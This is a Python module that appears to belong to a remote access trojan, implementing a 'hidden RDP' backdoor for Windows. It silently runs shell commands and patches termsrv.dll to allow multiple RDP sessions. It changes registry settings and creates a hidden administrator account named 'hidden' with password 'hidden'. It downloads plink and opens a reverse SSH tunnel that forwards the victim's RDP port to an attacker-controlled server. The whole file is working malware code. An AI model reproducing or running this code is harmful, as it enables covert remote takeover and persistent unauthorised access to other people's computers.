from ctypes import windll
import os
from subprocess import call, Popen
from re import sub
from Modules import execute as Execute
from client import SERVER_ADDRESS

TERMSRV_DLL_PATH = 'C:\\Windows\\System32\\termsrv.dll'


def is_admin_privilege():
    """ Return if the app has admin privileges"""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def read_dll_source():
    """ Returns the Hex source of the dll """
    with open(TERMSRV_DLL_PATH, 'rb') as f:
        return f.read().hex()


def shell_command(command):
    """ Silently execute a shell command """
    call(command, shell=True, creationflags=0x08000000)


def reverse_rdp_port(client, ssh_password):
    """ Creates a reverse rdp connection to the server. """
    plink_path = Execute.download_and_execute(url='https://the.earth.li/~sgtatham/putty/0.75/w64/plink.exe')
    if plink_path is not None:
        command = 'echo n | {plink_path} ssh-rdp-server@{ssh_ip} -pw {ssh_password} -P {ssh_port} -2 -4 -T -N -C -R {connection_port}:127.0.0.1:3389'.format(plink_path=plink_path, ssh_ip=SERVER_ADDRESS, ssh_password=ssh_password, ssh_port=22, connection_port=6969)
        Popen(command, shell=True, creationflags=0x08000000)  # Start tunnel without blocking
        client.send('Successfully patched and created a reverse rdp tunnel.')


def patch(client, ssh_password):
    if is_admin_privilege() is False:
        print('No admin perms')
    else:
        source = read_dll_source()
        patch_bytes = 'b80001000089813806000090'
        patched = False

        if patch_bytes in source:
            # Start the service
            shell_command('net start termservice /y')
            reverse_rdp_port(client, ssh_password)  # Reverse RDP Port
            patched = True
        else:
            unpatched_bytes_regex = '39813c0600000f84[a-f0-9]{4}(0200|0100)'
            patched_source = sub(unpatched_bytes_regex, patch_bytes, source)
            if patched_source != source:
                patched = True
            else:
                unpatched_bytes_list = ['8b993c0600008bb938060000', '3b81200300000f84b3040200']
                for unpatched_bytes in unpatched_bytes_list:
                    if unpatched_bytes in source:
                        patched_source = source.replace(unpatched_bytes, patch_bytes)
                        patched = True

            if patched:
                # Stop the service from running in the background
                shell_command('net stop termservice /y')

                # Take 'TrustedInstaller' ownership to allow editing
                shell_command('takeown /f "{}" /a'.format(TERMSRV_DLL_PATH))
                shell_command('icacls "{}" /grant "everyone":(F)'.format(TERMSRV_DLL_PATH))

                # Patch Dll
                with open(TERMSRV_DLL_PATH, 'wb') as f:
                    f.write(bytes.fromhex(patched_source))

                # Give back 'TrustedInstaller' ownership to the patched termsrv dll
                shell_command('icacls "{}" /setowner "NT SERVICE\TrustedInstaller"'.format(TERMSRV_DLL_PATH))
                shell_command('icacls "{}" /grant "NT SERVICE\TrustedInstaller:(RX)"'.format(TERMSRV_DLL_PATH))
                shell_command('icacls "{}" /remove:g "everyone":(F)')

                # Add registry rules to make the machine compatible with the patch
                shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f')  # Enable RDP
                shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0X00000000 /f')  # Allow multiple connections to the RDP
                shell_command('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 0X000f423f /f')  # Allow unlimited connection at a time
                shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList" /v fDisabledAllowList /t REG_DWORD /d 0X00000001 /f')

                # Add hidden user with admin perms to log into
                shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hidden /t REG_DWORD /d 0X00000000 /f')  # Hide from user
                shell_command('net user hidden hidden /ADD')  # Make a new user (user:pass)(hidden:hidden)
                shell_command('net localgroup Administrators hidden /ADD')  # Give admin perms

                # Start the service
                shell_command('net start termservice /y')

                # Reverse RDP Port
                reverse_rdp_port(client, ssh_password)

        if not patched:
            client.send('HRDP failed. No patches were available')
